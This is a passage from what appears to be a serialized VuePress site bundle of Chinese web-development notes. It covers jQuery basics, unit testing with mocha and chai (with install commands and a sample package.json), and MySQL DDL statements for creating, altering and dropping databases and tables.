元素\n$("#test") \\\\ 选取id 为test的元素\n$(".test") \\\\ 选取class为test的元素\n$("*") \\\\ 选取所有元素\n$(this) \\\\ 选取当前 html 元素\n$("p.intro") \\\\ 选取 class 为 intro 的 <p> 元素\n$("p:first") \\\\ 选取第一个 <p> 元素\n$("ul li:first") \\\\ 选取第一个 <ul> 元素的第一个 <li> 元素\n$("ul li:first-child") \\\\ 选取每个 <ul> 元素的第一个 <li> 元素\n$("[href]") \\\\ 选取带有 href 属性的元素\n$("a[target=\'_blank\']") \\\\ 选取所有 target 属性值等于 "_blank" 的 <a> 元素\n$("a[target!=\'_blank\']") \\\\ 选取所有 target 属性值不等于 "_blank" 的 <a> 元素\n$(":button") \\\\ 选取所有 type="button" 的 <input> 元素 和 <button> 元素\n$("tr:even") \\\\ 选取偶数位置的 <tr> 元素\n$("tr:odd") \\\\ 选取奇数位置的 <tr> 元素\n$("p").css("background-color","red") \\\\ 把所有 p 元素的背景颜色更改为红色\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 1.4 事件\n\n    页面对不同方式访问的响应叫做事件。\n    $(document).ready() 方法允许我们在文档完全加载完后执行函数。\n    鼠标事件：click(单击)、dblclick(双击)、mouseenter(移入)、mouseleave(移出)、mousedown(按下)、mouseup(放开)、hover(按下触发第一个函数，放开触发第二个函数)。\n    表单事件：submit(提交)、change(改变)、focus(获得焦点)、blur(失去焦点)。\n    键盘事件：keydown(按住)、keypress(按下放开)、keyup(放开)。\n    文档/窗口事件：load(加载)、resize(尺寸改变)、scroll(滑动)、unload(退出)\n\n\n# 2. 基础效果\n\n\n# 2.1 隐藏和显示\n\n$(selector).hide(speed,callback);//speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n$(selector).show(speed,callback);//speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n$(selector).toggle(speed,callback);//隐藏和显示效果切换，speed和callback同上\n\n\n1\n2\n3\n\n\n\n# 2.2 淡入淡出\n\n$(selector).fadein(speed,callback);//淡入。speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n$(selector).fadeout(speed,callback);//淡出。speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n$(selector).fadetoggle(speed,callback);//淡入和淡出效果切换，speed和callback同上\n$(selector).fadeto(speed,opacity,callback);//渐变，speed参数必须，代表速度可取"slow"、"fast" 或毫秒值；opacity参数必须，代表透明度可取介于 0 与 1 之间的值；callback参数可选\n\n\n1\n2\n3\n4\n\n\n\n# 2.3 滑动\n\n$(selector).slidedown(speed,callback);//向下滑动元素。speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n$(selector).slideup(speed,callback);//向上滑动元素。speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n$(selector).slidetoggle(speed,callback);//向上滑动元素和向下滑动元素切换。speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n\n\n1\n2\n3\n\n\n\n# 2.4 动画\n\n$(selector).animate({params},speed,callback);//params 参数必须，代表要定义形成动画的css 属性；speed参数可选，代表速度可取"slow"、"fast" 或毫秒值；callback参数可选\n//例子：\n$("button").click(function(){\n    $("div").animate({\n    left:\'250px\',\n    opacity:\'0.5\',\n    height:\'150px\',\n    width:\'150px\'\n    });\n});\n//逐一执行，动态的\n$(document).ready(function(){\n    $("button").click(function(){\n    var div=$("div");\n    div.animate({height:\'300px\',opacity:\'0.4\'});\n    div.animate({width:\'300px\',opacity:\'0.8\'});\n    div.animate({height:\'100px\',opacity:\'0.4\'});\n    div.animate({width:\'100px\',opacity:\'0.8\'});\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 2.5 停止效果/动画\n\n$(selector).stop(stopall,gotoend); //可以停止正在滑动、淡入淡出和自定义动画等效果。stopall参数可选，代表是否应该清除动画队列，默认是false；gotoend参数可选，代表是否立即完成当前动画，默认是 false；\n$("#start").click(function(){//开始动画\n    $("div").animate({left:\'100px\'},5000);\n    $("div").animate({fontsize:\'3em\'},5000);\n});\n$("#stop").click(function(){\n    $("div").stop();//不清除队列动画、不立即完成当前动画，也就是停止当前动画但可以继续执行队列后面的动画\n});\n$("#stop2").click(function(){\n    $("div").stop(true);//清除队列动画、不立即完成当前动画，也就是停止当前动画也不可以继续执行队列后面的动画\n});\n$("#stop3").click(function(){\n    $("div").stop(true,true);//清除队列动画、立即完成当前动画，也就是立即完成当前动画但不可以继续执行队列后面的动画\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 2.6 chaining\n\n    链接（chaining）技术，允许我们在相同的元素上运行多条 jquery 命令，一条接着另一条。\n\n$("#p1").css("color","red")\n    .slideup(2000)\n    .slidedown(2000);\n\n\n1\n2\n3\n\n\n\n# 3. html\n\n\n# 3.1 获取和设置\n\n    text()设置或返回所选元素的文本内容，不包括html标签\n    html()设置或返回所选元素的内容，包括html标签\n    val()设置或返回表单字段的value值\n    三个方法没有入参时是获取，有参数时是设置。\n    三个方法同样拥有回调函数。回调函数有两个参数：被选元素列表中当前元素的下标，以及原始（旧的）值\n\n$(document).ready(function(){\n    $("#btn1").click(function(){\n        $("#test1").text(function(i,origtext){\n            alert("旧文本: " + origtext + " 新文本: hello world! (index: " + i + ")");\n        });\n    });\n    $("#btn2").click(function(){\n        $("#test2").html(function(i,origtext){\n            alert("旧 html: " + origtext + " 新 html: hello <b>world!</b> (index: " + i + ")");\n        });\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n    用atr()设置属性值，可以设置多个属性，也可以只设置一个属性并给予回调函数\n\n$("button").click(function(){\n    $("#w3s").attr({\n    "href" : "//www.w3cschool.cn/jquery",\n    "title" : "jquery 教程"\n    });\n});\n$("button").click(function(){\n    $("#w3cschool").attr("href", function(i,origvalue){\n    return origvalue + "/jquery";\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 3.2 添加元素\n\n    ppend()在被选元素内部的结尾插入指定内容\n    prepend()在被选元素内部的开头插入指定内容\n    append()和prepend()可以插多个\n\nfunction appendtext(){\n    var txt1="<p>文本。</p>";              // 使用 html 标签创建文本\n    var txt2=$("<p></p>").text("文本。");  // 使用 jquery 创建文本\n    var txt3=document.createelement("p");\n    txt3.innerhtml="文本。";               // 使用 dom 创建文本 text with dom\n    $("body").append(txt1,txt2,txt3);      // 追加新元素\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n    after()在被选元素之后插入指定内容     before()在被选元素之前插入指定内容     after()和before()可以插多个\n\nfunction aftertext(){\n    var txt1="<b>i </b>";                    // 使用 html 创建元素\n    var txt2=$("<i></i>").text("love ");     // 使用 jquery 创建元素\n    var txt3=document.createelement("big");  // 使用 dom 创建元素\n    txt3.innerhtml="jquery!";\n    $("img").after(txt1,txt2,txt3);          // 在图片后添加文本\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 3.3 删除元素\n\n    remove() - 删除被选元素（及其子元素）\n    empty() - 从被选元素中删除子元素\n\n\n# 3.4 css类\n\n    addclass() - 向被选元素添加一个或多个类\n    removeclass() - 从被选元素删除一个或多个类\n    toggleclass() - 对被选元素进行添加/删除类的切换操作\n\n\n# 3.5 css()方法\n\n    css()方法可以获取或者设置多个样式值     css("propertyname");//获取元素的propertyname的value     css("propertyname","value");//为元素设置propertyname为value的样式\n\n\n# 3.6 尺寸\n\n    width()获取元素的宽度\n    height()获取元素的高度\n    innerwidth()获取元素加内边距的宽度\n    innerheight()获取元素加内边距的高度\n    outerwidth()获取元素加内边距加外边距的宽度\n    outerheight()获取元素加内边距加外边距 的高度\n\n\n# 4. 遍历\n\n\n# 4.1 祖先\n\n    parent()返回被选元素的直接父元素\n    parents()返回被选元素的所有祖先元素，它一路向上直到文档的根元素 (<html>)\n    parentsuntil()返回介于两个给定元素之间的所有祖先元素\n\n\n# 4.2 后代\n\n    children()返回被选元素的所有直接子元素\n    $("div").find("span");//返回div的后代中所有的span\n    $("div").find("*");//返回div所有后代\n\n\n# 4.3 同胞\n\n    siblings()返回被选元素的所有同胞元素，但不包括这个被选元素\n    next()返回被选元素的下一个同胞元素\n    nextall()返回被选元素的所有跟随的同胞元素，但不包括这个被选元素\n    nextuntil()返回介于两个给定参数之间的所有跟随的同胞元素，但不包括这两个元素\n    prev()返回被选元素的上一个同胞元素\n    prevall()返回被选元素的所有上方的同胞元素，但不包括这个被选元素\n    prevuntil()返回介于两个给定参数之间的所有跟随的同胞元素，但不包括这两个元素\n\n\n# 4.4 过滤\n\nfirst()// 返回第一个元素，类似$("ul li:first")  \nlast()// 返回最后一个元素  \neq()// 返回指定第几个元素，first()和last()都没有入参，但eq()有入参，就是返回指定位置参数  \n$("p").filter(".intro");//返回带有类名"intro"的所有 <p> 元素  \n$("p").not(".intro");//返回不带有类名 "intro" 的所有 <p> 元素  \n\n\n1\n2\n3\n4\n5\n\n\n\n# 5. jquery ajax\n\n\n# 5.1 load()方法\n\n    load() 方法从服务器加载数据，并把返回的数据放置到指定的元素中\n    $(selector).load(url,data,function(response,status,xhr)) //url必须，data可选代表入参，回调函数可选\n\n$("button").click(function(){\n    $("#div1").load("demo_test.txt",function(responsetxt,statustxt,xhr){\n        if(statustxt=="success")\n            alert("external content loaded successfully!");\n        if(statustxt=="error")\n            alert("error: "+xhr.status+": "+xhr.statustext);\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 5.2 get()和post()方法\n\n    $.get(url,data,function(data,status,xhr),datatype)//url必须，data可选\n\n 1. datatype规定预期的服务器响应的数据类型，如下几种：\n    \n    * "xml" - 一个 xml 文档\n    * "html" - html 作为纯文本\n    * "text" - 纯文本字符串\n    * "script" - 以 javascript 运行响应，并以纯文本返回\n    * "json" - 以 json 运行响应，并以 javascript 对象返回\n    * "jsonp" - 使用 jsonp 加载一个 json 块，将添加一个 "?callback=?" 到 url 来规定回调\n\n 2. function(data,status,xhr)当请求成功时运行的函数\n\n * data - 包含来自请求的结果数据\n * status - 包含请求的状态（"success"、"notmodified"、"error"、"timeout"、"parsererror"）\n * xhr - 包含 xmlhttprequest 对象\n * $(selector).post(url,data,function(data,status,xhr),datatype) //参数同get()方法\n\n\n# 5.3 ajax()方法\n\n    ajax()方法用于执行 ajax（异步 http）请求，所有的 jquery ajax 方法都使用 ajax() 方法，$.ajax({name:value, name:value, ... })\n\n$(document).ready(function(){\n    $("button").click(function(){\n        $.ajax({\n            url:"demo_ajax_load.txt",\n            async:false,\n            success:function(result){\n                $("div").html(result);\n            }\n        });\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n',charsets:{cjk:!0}},{title:"使用mocha+chai进行单元测试",frontmatter:{},regularPath:"/book-web/web%E5%89%8D%E7%AB%AF%E6%B5%8B%E8%AF%95%E4%B8%8E%E8%B0%83%E8%AF%95/%E5%9F%BA%E4%BA%8Emocha+chai%E7%9A%84%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95.html",relativePath:"book-web/web前端测试与调试/基于mocha+chai的单元测试.md",key:"v-77e13159",path:"/book-web/web%E5%89%8D%E7%AB%AF%E6%B5%8B%E8%AF%95%E4%B8%8E%E8%B0%83%E8%AF%95/%E5%9F%BA%E4%BA%8Emocha+chai%E7%9A%84%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95.html",headers:[{level:2,title:"mocha前端测试框架",slug:"mocha前端测试框架",normalizedTitle:"mocha前端测试框架",charIndex:173},{level:3,title:"钩子函数",slug:"钩子函数",normalizedTitle:"钩子函数",charIndex:629},{level:3,title:"使用async/await",slug:"使用async-await",normalizedTitle:"使用async/await",charIndex:1017},{level:2,title:"chai断言集合库",slug:"chai断言集合库",normalizedTitle:"chai断言集合库",charIndex:1327},{level:2,title:"mochawesome测试结果报告",slug:"mochawesome测试结果报告",normalizedTitle:"mochawesome测试结果报告",charIndex:2322},{level:2,title:"nyc测试覆盖报告",slug:"nyc测试覆盖报告",normalizedTitle:"nyc测试覆盖报告",charIndex:2500},{level:2,title:"安装命令合集",slug:"安装命令合集",normalizedTitle:"安装命令合集",charIndex:2766},{level:2,title:"示例package.json",slug:"示例package-json",normalizedTitle:"示例package.json",charIndex:3055}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"mocha前端测试框架 钩子函数 使用async/await chai断言集合库 mochawesome测试结果报告 nyc测试覆盖报告 安装命令合集 示例package.json",content:'# 使用mocha+chai进行单元测试\n\n    web前端使用JavaScript或TypeScript时开发，经常要对一些功能点进行测试，甚至还要提供直观的测试报告。一些测试技术用而生，例如jest和mocha等。这里我们选用mocha测试框架+chai断言库来进行测试，而测试报告使用mochawesome，覆盖报告使用nyc。\n\n\n# mocha前端测试框架\n\n    mocha是一个可以在node.js和浏览器上运行的前端测试框架，它支持不同风格的断言库，也支持同步异步测试、测试用例分组等功能。\n\n    命令相关，一般是“mocha 文件名”，如果测试ts的话，需要在命令里加“ts-node/register”来编译运行。如果需要测试文件夹里的所有文件，那就用递归也就是加“-r 文件夹名”。\n\n    代码示例：\n\nimport { expect } from \'chai\';\ndescribe(\'Array\', function() {\n  describe(\'#indexOf()\', function() {\n    it(\'should return -1 when the value is not present\', function() {\n      expect([1, 2, 3].indexOf(4)).to.equal(-1);\n    });\n  });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 钩子函数\n\ndescribe(\'hooks\', function() {\n  before(function() {\n    // runs before all tests in this block\n  });\n  after(function() {\n    // runs after all tests in this block\n  });\n  beforeEach(function() {\n    // runs before each test in this block\n  });\n  afterEach(function() {\n    // runs after each test in this block\n  });\n  // test cases\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 使用async/await\n\nbeforeEach(async function() {\n  await db.clear();\n  await db.save([tobi, loki, jane]);});describe(\'#find()\', function() {\n  it(\'responds with matching records\', async function() {\n    const users = await db.find({type: \'User\'});\n    users.should.have.length(3);\n  });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# chai断言集合库\n\n    支持expect、assert、should断言语法\n\nvar assert = require(\'chai\').assert,\n    foo = \'bar\',\n    beverages = { tea: [ \'chai\', \'matcha\', \'oolong\' ] };\nassert.typeOf(foo, \'string\');\nassert.typeOf(foo, \'string\', \'foo is a string\');\nassert.equal(foo, \'bar\', \'foo equal `bar`\');\nassert.lengthOf(foo, 3,\'foo`s value has a length of 3\');\nassert.lengthOf(beverages.tea, 3,\n    \'beverages has 3 types of tea\');\n\nvar expect = require(\'chai\').expect,\n    foo = \'bar\',\n    beverages = { tea: [ \'chai\', \'matcha\', \'oolong\' ] };\nexpect(foo).to.be.a(\'string\');\nexpect(foo).to.equal(\'bar\');\nexpect(foo).to.have.lengthOf(3);\nexpect(beverages).to.have.property(\'tea\').with.lengthOf(3);\n\nvar should = require(\'chai\').should(),\n    foo = \'bar\',\n    beverages = { tea: [ \'chai\', \'matcha\', \'oolong\' ] };\nfoo.should.be.a(\'string\');\nfoo.should.equal(\'bar\');\nfoo.should.have.lengthOf(3);\nbeverages.should.have.property(\'tea\').with.lengthOf(3);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# mochawesome测试结果报告\n\n    mochawesome是一个用于mocha测试框架的自定义报告器，可以生成html/css报告在浏览器上查看，也可以本地查看。\n    一般在命令里添加“--reporter mochawesome”就可使用mochawesome。当然，最好清空之前的一些测试报告，那使用“rm -rf 文件夹名”。\n\n\n# nyc测试覆盖报告\n\n    nyc是一个测试覆盖率报告器，可以生成html/css报告在浏览器上查看，也可以本地查看。\n    如果你用的jest其实就不用nyc了，已经自带了测试覆盖报告的类库。\n    还要配置nyc覆盖范围，要配置include和exclude等信息。     给它确定报告生成的位置，使用“--report-dir 文件夹名”命令；要生成html形式的报告，使用“--reporter=lcov”命令；生成text形式的，使用“--reporter=text”，当然你两种都想要就两个命令都加上。\n\n\n# 安装命令合集\n\n * npm install --save-dev mocha 用于局部安装mocha\n * npm install --save-dev chai 用于局部安装chai\n * npm install --save-dev mochawesome 用于局部安装mochawesome\n * npm install --save-dev nyc 用于局部安装nyc\n * npm install --save-dev @types/mocha 编写时要用到的库\n * npm install --save-dev @types/chai 编写时要用到的库\n\n\n# 示例package.json\n\n{\n  "name": "datastructures_ts",\n  "version": "1.0.0",\n  "description": "datastructures",\n  "keywords": [],\n  "author": "Liu",\n  "license": "ISC",\n  "scripts": {\n    "clean": "rm -rf ./dist ./coverage ./.nyc_output ./coverage.lcov ./mochawesome-report",\n    "dev": "npm run clean && npm run generate-report",\n    "test": "mocha -r ts-node/register ./test/ts/**/*.spec.ts ./test/ts/**/**/*.spec.ts --reporter mochawesome",\n    "generate-report": "nyc --report-dir coverage npm run test && nyc report --reporter=text"\n  },\n  "nyc": {\n    "include": [\n      "src/ts/*.ts",\n      "src/ts/**/*.ts"\n    ],\n    "exclude": [\n      "typings"\n    ],\n    "extension": [\n      ".ts"\n    ],\n    "reporter": [\n      "json",\n      "html"\n    ],\n    "all": true\n  },\n  "devDependencies": {\n    "@types/chai": "^4.2.11",\n    "@types/mocha": "^5.2.7",\n    "chai": "^4.1.2",\n    "mocha": "^5.2.0",\n    "mochawesome": "^3.1.2",\n    "nyc": "^11.9.0",\n    "ts-node": "^8.8.2",\n    "typescript": "^3.8.3"\n  },\n  "dependencies": {\n    "core-js": "^3.6.4"\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n',normalizedContent:'# 使用mocha+chai进行单元测试\n\n    web前端使用javascript或typescript时开发，经常要对一些功能点进行测试，甚至还要提供直观的测试报告。一些测试技术用而生，例如jest和mocha等。这里我们选用mocha测试框架+chai断言库来进行测试，而测试报告使用mochawesome，覆盖报告使用nyc。\n\n\n# mocha前端测试框架\n\n    mocha是一个可以在node.js和浏览器上运行的前端测试框架，它支持不同风格的断言库，也支持同步异步测试、测试用例分组等功能。\n\n    命令相关，一般是“mocha 文件名”，如果测试ts的话，需要在命令里加“ts-node/register”来编译运行。如果需要测试文件夹里的所有文件，那就用递归也就是加“-r 文件夹名”。\n\n    代码示例：\n\nimport { expect } from \'chai\';\ndescribe(\'array\', function() {\n  describe(\'#indexof()\', function() {\n    it(\'should return -1 when the value is not present\', function() {\n      expect([1, 2, 3].indexof(4)).to.equal(-1);\n    });\n  });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 钩子函数\n\ndescribe(\'hooks\', function() {\n  before(function() {\n    // runs before all tests in this block\n  });\n  after(function() {\n    // runs after all tests in this block\n  });\n  beforeeach(function() {\n    // runs before each test in this block\n  });\n  aftereach(function() {\n    // runs after each test in this block\n  });\n  // test cases\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 使用async/await\n\nbeforeeach(async function() {\n  await db.clear();\n  await db.save([tobi, loki, jane]);});describe(\'#find()\', function() {\n  it(\'responds with matching records\', async function() {\n    const users = await db.find({type: \'user\'});\n    users.should.have.length(3);\n  });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# chai断言集合库\n\n    支持expect、assert、should断言语法\n\nvar assert = require(\'chai\').assert,\n    foo = \'bar\',\n    beverages = { tea: [ \'chai\', \'matcha\', \'oolong\' ] };\nassert.typeof(foo, \'string\');\nassert.typeof(foo, \'string\', \'foo is a string\');\nassert.equal(foo, \'bar\', \'foo equal `bar`\');\nassert.lengthof(foo, 3,\'foo`s value has a length of 3\');\nassert.lengthof(beverages.tea, 3,\n    \'beverages has 3 types of tea\');\n\nvar expect = require(\'chai\').expect,\n    foo = \'bar\',\n    beverages = { tea: [ \'chai\', \'matcha\', \'oolong\' ] };\nexpect(foo).to.be.a(\'string\');\nexpect(foo).to.equal(\'bar\');\nexpect(foo).to.have.lengthof(3);\nexpect(beverages).to.have.property(\'tea\').with.lengthof(3);\n\nvar should = require(\'chai\').should(),\n    foo = \'bar\',\n    beverages = { tea: [ \'chai\', \'matcha\', \'oolong\' ] };\nfoo.should.be.a(\'string\');\nfoo.should.equal(\'bar\');\nfoo.should.have.lengthof(3);\nbeverages.should.have.property(\'tea\').with.lengthof(3);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# mochawesome测试结果报告\n\n    mochawesome是一个用于mocha测试框架的自定义报告器，可以生成html/css报告在浏览器上查看，也可以本地查看。\n    一般在命令里添加“--reporter mochawesome”就可使用mochawesome。当然，最好清空之前的一些测试报告，那使用“rm -rf 文件夹名”。\n\n\n# nyc测试覆盖报告\n\n    nyc是一个测试覆盖率报告器，可以生成html/css报告在浏览器上查看，也可以本地查看。\n    如果你用的jest其实就不用nyc了，已经自带了测试覆盖报告的类库。\n    还要配置nyc覆盖范围，要配置include和exclude等信息。     给它确定报告生成的位置，使用“--report-dir 文件夹名”命令；要生成html形式的报告，使用“--reporter=lcov”命令；生成text形式的，使用“--reporter=text”，当然你两种都想要就两个命令都加上。\n\n\n# 安装命令合集\n\n * npm install --save-dev mocha 用于局部安装mocha\n * npm install --save-dev chai 用于局部安装chai\n * npm install --save-dev mochawesome 用于局部安装mochawesome\n * npm install --save-dev nyc 用于局部安装nyc\n * npm install --save-dev @types/mocha 编写时要用到的库\n * npm install --save-dev @types/chai 编写时要用到的库\n\n\n# 示例package.json\n\n{\n  "name": "datastructures_ts",\n  "version": "1.0.0",\n  "description": "datastructures",\n  "keywords": [],\n  "author": "liu",\n  "license": "isc",\n  "scripts": {\n    "clean": "rm -rf ./dist ./coverage ./.nyc_output ./coverage.lcov ./mochawesome-report",\n    "dev": "npm run clean && npm run generate-report",\n    "test": "mocha -r ts-node/register ./test/ts/**/*.spec.ts ./test/ts/**/**/*.spec.ts --reporter mochawesome",\n    "generate-report": "nyc --report-dir coverage npm run test && nyc report --reporter=text"\n  },\n  "nyc": {\n    "include": [\n      "src/ts/*.ts",\n      "src/ts/**/*.ts"\n    ],\n    "exclude": [\n      "typings"\n    ],\n    "extension": [\n      ".ts"\n    ],\n    "reporter": [\n      "json",\n      "html"\n    ],\n    "all": true\n  },\n  "devdependencies": {\n    "@types/chai": "^4.2.11",\n    "@types/mocha": "^5.2.7",\n    "chai": "^4.1.2",\n    "mocha": "^5.2.0",\n    "mochawesome": "^3.1.2",\n    "nyc": "^11.9.0",\n    "ts-node": "^8.8.2",\n    "typescript": "^3.8.3"\n  },\n  "dependencies": {\n    "core-js": "^3.6.4"\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n',charsets:{cjk:!0}},{title:"数据定义语言DDL",frontmatter:{},regularPath:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0mysql/1.%E6%95%B0%E6%8D%AE%E5%AE%9A%E4%B9%89%E8%AF%AD%E8%A8%80DDL.html",relativePath:"book-web/web后端/学习mysql/1.数据定义语言DDL.md",key:"v-9cc17058",path:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0mysql/1.%E6%95%B0%E6%8D%AE%E5%AE%9A%E4%B9%89%E8%AF%AD%E8%A8%80DDL.html",headers:[{level:2,title:"DDL简介",slug:"ddl简介",normalizedTitle:"ddl简介",charIndex:16},{level:2,title:"库的管理",slug:"库的管理",normalizedTitle:"库的管理",charIndex:321},{level:2,title:"表的管理",slug:"表的管理",normalizedTitle:"表的管理",charIndex:1184},{level:3,title:"创建表",slug:"创建表",normalizedTitle:"创建表",charIndex:1193},{level:3,title:"修改表",slug:"修改表",normalizedTitle:"修改表",charIndex:2158},{level:3,title:"删除表",slug:"删除表",normalizedTitle:"删除表",charIndex:264},{level:3,title:"复制表",slug:"复制表",normalizedTitle:"复制表",charIndex:3148},{level:2,title:"常见数据类型",slug:"常见数据类型",normalizedTitle:"常见数据类型",charIndex:4889},{level:3,title:"数值型",slug:"数值型",normalizedTitle:"数值型",charIndex:4900},{level:3,title:"字符型",slug:"字符型",normalizedTitle:"字符型",charIndex:7895},{level:3,title:"日期型",slug:"日期型",normalizedTitle:"日期型",charIndex:10407},{level:2,title:"常见约束和自增长列",slug:"常见约束和自增长列",normalizedTitle:"常见约束和自增长列",charIndex:11159},{level:3,title:"一些概念",slug:"一些概念",normalizedTitle:"一些概念",charIndex:11173},{level:3,title:"主键约束",slug:"主键约束",normalizedTitle:"主键约束",charIndex:12276},{level:3,title:"外键约束",slug:"外键约束",normalizedTitle:"外键约束",charIndex:12330},{level:3,title:"唯一\\检查\\默认\\非空约束",slug:"唯一-检查-默认-非空约束",normalizedTitle:"唯一\\检查\\默认\\非空约束",charIndex:16394},{level:3,title:"自增长列",slug:"自增长列",normalizedTitle:"自增长列",charIndex:11164},{level:2,title:"新建员工相关表的sql",slug:"新建员工相关表的sql",normalizedTitle:"新建员工相关表的sql",charIndex:20386}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"DDL简介 库的管理 表的管理 创建表 修改表 删除表 复制表 常见数据类型 数值型 字符型 日期型 常见约束和自增长列 一些概念 主键约束 外键约束 唯一\\检查\\默认\\非空约束 自增长列 新建员工相关表的sql",content:"# 数据定义语言DDL\n\n\n# DDL简介\n\n数据定义语言(Data Definition Language, DDL)是SQL语言集中负责数据结构定义与数据库对象定义的语言。也就说是对库和表进行管理，具体就是创建(create)、修改(alter)、删除(drop)。常见的如下：\n\n * CREATE DATABASE - 创建新数据库\n * ALTER DATABASE - 修改数据库\n * CREATE TABLE - 创建新表\n * ALTER TABLE - 变更（改变）数据库表\n * DROP TABLE - 删除表\n * CREATE INDEX - 创建索引（搜索键）\n * DROP INDEX - 删除索引\n\n\n# 库的管理\n\n 1. 创建库\n    \n    语法：create database [if not exists] 库名;。[if exists]和[if not exists]只在库和表的创建和删除时才能使用。\n    \n    例如使用navicat创建一个test数据库，字符集是utf8mb4，那sql语句对应如下：\n    \n    # 创建库，可以不加``\n    CREATE DATABASE `test`;\n    # 查看有哪些库\n    SHOW DATABASES;\n    \n    \n    1\n    2\n    3\n    4\n    \n    \n    如果你不清楚库是否存在，可以加上if not exists\n    \n    # 创建库可以带上了`if not exists`\n    CREATE DATABASE IF NOT EXISTS `test`;\n    \n    \n    1\n    2\n    \n\n 2. 修改库\n    \n    修改库的操作很少，容易引起一些问题，但一些影响不太大的库设置是可以修改的。\n    \n    # 默认字符集一般是utf8\n    ALTER DATABASE `test` CHARACTER SET 'utf8mb4';\n    # 其实字符集可以在创建库时就带上\n    CREATE DATABASE IF NOT EXISTS `test` CHARACTER SET 'utf8mb4';\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 3. 删除库\n    \n    语法：drop database [if exists] 库名\n    \n    # 删除库\n    DROP DATABASE IF EXISTS `test`;\n    # 查看有哪些库\n    SHOW DATABASES;\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# 表的管理\n\n\n# 创建表\n\n语法：\n\ncreate table 表名 (\n  列名 列的类型 【列的约束】,\n  ...\n)\n\n\n1\n2\n3\n4\n\n\n创建一个book表和一个author表\n\n# 上一小节我们删掉了test库，这里重新建一个test库\nCREATE DATABASE IF NOT EXISTS `test` CHARACTER SET 'utf8mb4';\n# 并且选择这个库作用当前库，否则会有`No database selected`错误\nUSE test;\n# 先看一下test库里有哪些表\nSHOW TABLES;\n# 建一个book表，如果不清楚建的表存到了哪个库，就用`test`.`book`\nCREATE TABLE book (\n  id          INT,          # 编号\n  bName       VARCHAR(20),  # 书名\n  price       DOUBLE,       # 价格\n  authorId    INT           # 作者\n);\n# 查看book表的结构\nDESC book;\n# 建一个author表\nCREATE TABLE author (\n  id          INT,          # 编号\n  aName       VARCHAR(20),  # 作者名\n  nation      VARCHAR(20)   # 国籍\n);\n# 查看author表的结构\nDESC author;\n# 看一下test库里有哪些表\nSHOW TABLES;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n关于No database selected错误，它的原因是没有指定当前数据库，sql运行时就不知道根据哪个数据来运行。\n\n * 第一种方式是使用USE test;来指定当前数据库。\n * 第二种方式是在sql语句中将表名改为test.authore，但是每次使用表名前都需要加上这个库名就很麻烦。\n * 第三种方式是把数据库客户端当前查询框顶部里选定一个数据库。该方法最后重新连接一下云端数据库，保证指定数据库成功。\n\n\n\n\n# 修改表\n\n修改表的核心语法：alter table 表名 add|drop|modify|change column 列名 [类型或约束]\n\n * 修改列名\n   alter table 表名 change column 旧列名 新列名 列的类型;\n * 修改列的类型或约束\n   alter table 表名 modify column 列名 新类型或新约束;\n * 添加新列\n   alter table 表名 add column 新列的列名 新列的类型或约束;\n * 删除旧列\n   alter table 表名 drop column 旧列的列名;\n * 修改表名\n   alter table 表名 rename to 新表名;\n\n# 